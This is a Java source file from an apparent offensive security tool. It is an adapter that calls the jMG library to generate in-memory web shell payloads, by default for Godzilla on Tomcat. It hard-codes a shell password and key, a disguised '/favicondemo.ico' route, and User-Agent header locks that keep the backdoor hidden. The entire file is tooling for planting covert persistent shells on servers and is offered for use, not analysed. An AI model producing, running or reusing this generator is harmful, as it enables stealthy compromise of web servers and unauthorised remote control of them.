package com.summersec.attack.integration.generator;

import com.summersec.attack.integration.generator.model.MemshellGenerateRequest;
import com.summersec.attack.integration.generator.model.MemshellGenerateResult;
import java.lang.reflect.Method;

public class JmgMemshellGeneratorAdapter implements MemshellGeneratorAdapter {
    @Override
    public MemshellGenerateResult generate(MemshellGenerateRequest request) {
        try {
            Class<?> constantsClass = resolveClass(
                "jmg.core.config.Constants",
                "jmg.sdk.config.Constants"
            );
            Class<?> configClass = resolveClass(
                "jmg.core.config.AbstractConfig",
                "jmg.sdk.config.AbstractConfig"
            );
            Class<?> generatorClass = resolveClass(
                "jmg.core.jMGenerator",
                "jmg.sdk.jMGenerator"
            );

            Object config = configClass.newInstance();
            invokeSetter(configClass, config, "setToolType", constantsClass, valueOrDefault(request.getToolType(), "TOOL_GODZILLA"));
            invokeSetter(configClass, config, "setServerType", constantsClass, valueOrDefault(request.getServerType(), "SERVER_TOMCAT"));
            invokeSetter(configClass, config, "setShellType", constantsClass, valueOrDefault(request.getShellType(), "SHELL_LISTENER"));
            invokeSetter(configClass, config, "setOutputFormat", constantsClass, valueOrDefault(request.getFormatType(), "FORMAT_BASE64"));
            invokeSetter(configClass, config, "setGadgetType", constantsClass, valueOrDefault(request.getGadgetType(), "GADGET_NONE"));
            applyOptionalTextConfig(configClass, config, request);
            configClass.getMethod("build").invoke(config);

            Object generator = generatorClass.getConstructor(configClass).newInstance(config);
            generatorClass.getMethod("genPayload").invoke(generator);
            Object payload = extractPayload(generatorClass, generator);
            return MemshellGenerateResult.ok("jMG", String.valueOf(payload), "", "");
        } catch (Exception e) {
            Throwable cause = e.getCause() != null ? e.getCause() : e;
            String message = cause.getMessage();
            if (message == null || message.trim().isEmpty()) {
                message = cause.toString();
            }
            return MemshellGenerateResult.fail("jMG", message);
        }
    }

    private static Class<?> resolveClass(String... names) throws ClassNotFoundException {
        for (String name : names) {
            try {
                return Class.forName(name);
            } catch (ClassNotFoundException ignored) {
            }
        }
        throw new ClassNotFoundException("无法定位 jMG API 类");
    }

    private static String valueOrDefault(String value, String fallback) {
        return value == null || value.trim().isEmpty() ? fallback : value.trim();
    }

    private static void invokeSetter(Class<?> configClass, Object config, String methodName, Class<?> constantsClass, String fieldName) throws Exception {
        fieldName = normalizeConstant(fieldName);
        String constantValue = String.valueOf(constantsClass.getField(fieldName).get(null));
        configClass.getMethod(methodName, String.class).invoke(config, constantValue);
    }

    private static void applyOptionalTextConfig(Class<?> configClass, Object config, MemshellGenerateRequest request) {
        invokeOptionalSetter(configClass, config, "setPass", defaultIfBlank(request.getOption(), "pass1024"));
        invokeOptionalSetter(configClass, config, "setPwd", defaultIfBlank(request.getOption(), "pass1024"));
        invokeOptionalSetter(configClass, config, "setPath", "/favicondemo.ico");
        invokeOptionalSetter(configClass, config, "setRoute", "/favicondemo.ico");
        invokeOptionalSetter(configClass, config, "setHeaderName", "User-Agent");
        invokeOptionalSetter(configClass, config, "setHeaderValue", "Mozilla/5.0");
        invokeOptionalSetter(configClass, config, "setUrlPattern", "/favicondemo.ico");
        invokeOptionalSetter(configClass, config, "setInjectPattern", "/favicondemo.ico");
        invokeOptionalSetter(configClass, config, "setLockHeaderKey", "User-Agent");
        invokeOptionalSetter(configClass, config, "setLockHeaderValue", "Mozilla/5.0");
        invokeOptionalSetter(configClass, config, "setKey", "3c6e0b8a9c15224a");
        invokeOptionalSetter(configClass, config, "setName", "shell");
    }

    private static void invokeOptionalSetter(Class<?> configClass, Object config, String methodName, String value) {
        if (value == null || value.trim().isEmpty()) {
            return;
        }
        try {
            Method method = configClass.getMethod(methodName, String.class);
            method.invoke(config, value);
            return;
        } catch (Exception ignored) {
        }
        try {
            Method method = configClass.getMethod(methodName, Object.class);
            method.invoke(config, value);
        } catch (Exception ignored) {
        }
    }

    private static String defaultIfBlank(String value, String fallback) {
        return value == null || value.trim().isEmpty() ? fallback : value.trim();
    }

    private static Object extractPayload(Class<?> generatorClass, Object generator) throws Exception {
        Exception lastError = null;
        String[] methodNames = new String[]{"getPayload", "getPayloadString", "formatPayload", "toString"};
        for (String methodName : methodNames) {
            try {
                return generatorClass.getMethod(methodName).invoke(generator);
            } catch (NoSuchMethodException e) {
                lastError = e;
            }
        }
        try {
            java.lang.reflect.Field field = generatorClass.getDeclaredField("payload");
            field.setAccessible(true);
            return field.get(generator);
        } catch (NoSuchFieldException e) {
            lastError = e;
        }
        if (lastError != null) {
            throw lastError;
        }
        throw new NoSuchMethodException("无法从 jMG 生成器中提取 payload");
    }

    private static String normalizeConstant(String fieldName) {
        if (fieldName == null) {
            return null;
        }
        if ("SERVER_SPRING".equals(fieldName)) {
            return "SERVER_SPRING_MVC";
        }
        if ("TOOL_NEOREG".equals(fieldName)) {
            return "TOOL_NEOREGEORG";
        }
        if ("SHELL_INTERCEPTOR".equals(fieldName)) {
            return "SHELL_INTERCEPTOR";
        }
        if ("SHELL_HANDLERMETHOD".equals(fieldName)) {
            return "SHELL_HANDLERMETHOD";
        }
        if ("SHELL_TOMCATVALVE".equals(fieldName)) {
            return "SHELL_TOMCATVALVE";
        }
        return fieldName;
    }
}
